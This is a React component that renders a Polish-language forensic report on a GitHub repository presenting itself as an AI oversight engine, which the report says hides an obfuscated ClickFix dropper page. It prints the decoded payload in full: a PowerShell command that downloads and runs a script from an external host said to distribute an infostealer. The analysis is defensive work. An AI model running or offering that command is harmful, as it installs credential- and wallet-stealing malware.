import React from 'react';
import { X, ShieldAlert, FileCode2, Terminal, AlertOctagon, CheckCircle2, Lock, ExternalLink } from 'lucide-react';

interface Props {
  onClose: () => void;
}

export default function ForensicAnalysisModal({ onClose }: Props) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-4xl max-h-[90vh] overflow-y-auto bg-neutral-900 border border-neutral-800 rounded-2xl shadow-2xl text-neutral-200">
        
        {/* Header */}
        <div className="sticky top-0 z-10 flex items-center justify-between p-5 border-b border-neutral-800 bg-neutral-900/95 backdrop-blur-md">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-rose-500/20 text-rose-400 border border-rose-500/30">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-white">
                Raport Bezpieczeństwa: Analiza Repozytorium GitHub
              </h2>
              <p className="text-xs text-neutral-400 font-mono">
                https://github.com/bakiraa/qyvaria-hardlogic-kernel-engine
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-neutral-400 hover:text-white hover:bg-neutral-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6 space-y-6 text-sm">
          {/* Executive Summary */}
          <div className="p-4 rounded-xl bg-rose-950/30 border border-rose-500/40 space-y-2">
            <div className="flex items-center gap-2 text-rose-300 font-semibold">
              <AlertOctagon className="w-5 h-5" />
              <span>Podsumowanie zagrożenia: Kampania ClickFix / Złośliwy Dropper</span>
            </div>
            <p className="text-neutral-300 leading-relaxed text-xs md:text-sm">
              Repozytorium deklaruje się w tytule jako <em>&quot;SentinelCore – The Autonomous Oversight Engine for Decentralized AI&quot;</em>.
              W rzeczywistości repozytorium <strong>nie posiada żadnego kodu backendowego, algorytmów ani bibliotek Python/C++/JS</strong>.
              Jedyną zawartością techniczną jest silnie zaciemniony plik <code className="text-rose-300 font-mono">index.html</code>,
              który po deobfuskacji okazuje się fałszywą stroną instalacyjną wymuszającą wykonanie złośliwego polecenia PowerShell.
            </p>
          </div>

          {/* Forensic Steps */}
          <div className="space-y-4">
            <h3 className="text-sm font-semibold uppercase tracking-wider text-neutral-400 flex items-center gap-2">
              <FileCode2 className="w-4 h-4 text-cyan-400" />
              Przebieg analizy kryminalistycznej (Forensic Deobfuscation)
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800">
                <span className="text-xs font-semibold text-neutral-400">1. Zawartość repozytorium git</span>
                <ul className="mt-2 space-y-1 font-mono text-xs text-neutral-300">
                  <li className="text-emerald-400">✓ README.md (marketingowy tekst)</li>
                  <li className="text-neutral-500">• button.svg, preview.svg</li>
                  <li className="text-rose-400 font-bold">• index.html (34 447 bajtów)</li>
                  <li className="text-amber-400">✗ Brak plików .py, .ts, .rs lub .cpp</li>
                </ul>
              </div>

              <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800">
                <span className="text-xs font-semibold text-neutral-400">2. Mechanizm zaciemniania (Obfuscation)</span>
                <p className="mt-2 font-mono text-xs text-neutral-300 leading-relaxed">
                  Klucz XOR: <span className="text-amber-300">QUntUb2Sc44LJvq0HRBdD21LKxZcXj+r</span><br/>
                  Fragmenty: 8 pól ukrytych <code className="text-cyan-300">_dcWyXOGGhXS[0-7]</code><br/>
                  Metoda: Base64 + cykliczny bajtowy XOR
                </p>
              </div>
            </div>

            {/* Extracted Payload */}
            <div className="p-4 rounded-xl bg-neutral-950 border border-rose-500/40">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-rose-400 flex items-center gap-1.5">
                  <Terminal className="w-4 h-4" />
                  Wykryty złośliwy ładunek (Payload) w zdekodowanym HTML
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
                  CRITICAL SEVERITY
                </span>
              </div>
              <pre className="p-3 rounded-lg bg-black/60 font-mono text-xs text-rose-300 overflow-x-auto border border-rose-900/40 select-all">
powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;iex(irm &apos;https://activation-full.cc/update/ps-script&apos;)&quot;
              </pre>
              <p className="mt-2 text-xs text-neutral-400">
                Adres <code className="text-amber-300">activation-full.cc</code> to zewnętrzny serwer dystrybuujący złośliwe oprogramowanie kradnące dane logowania, portfele kryptowalutowe oraz tokeny sesyjne (Infostealer).
              </p>
            </div>

            {/* Protective Action */}
            <div className="p-4 rounded-xl bg-emerald-950/20 border border-emerald-500/30 flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
              <div>
                <h4 className="text-xs font-semibold text-emerald-300">Zastosowane środki ochronne</h4>
                <p className="text-xs text-neutral-300 mt-1">
                  System odmówił wykonania jakiegokolwiek polecenia z repozytorium.
                  Jednocześnie uruchomiony został autentyczny, bezpieczny kod matematyczny <strong>SVL System Kernel</strong> zdefiniowany w Twoim promptcie:
                  klasy <code>TopologicalInfinityEngine</code>, <code>SVLProtectedVariable</code> oraz rejestr chronologiczny SI.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="flex items-center justify-end p-4 border-t border-neutral-800 bg-neutral-900/90 gap-3">
          <button
            onClick={onClose}
            className="px-4 py-2 text-xs font-medium text-neutral-200 bg-neutral-800 hover:bg-neutral-700 rounded-lg transition-colors cursor-pointer"
          >
            Zamknij raport
          </button>
        </div>
      </div>
    </div>
  );
}
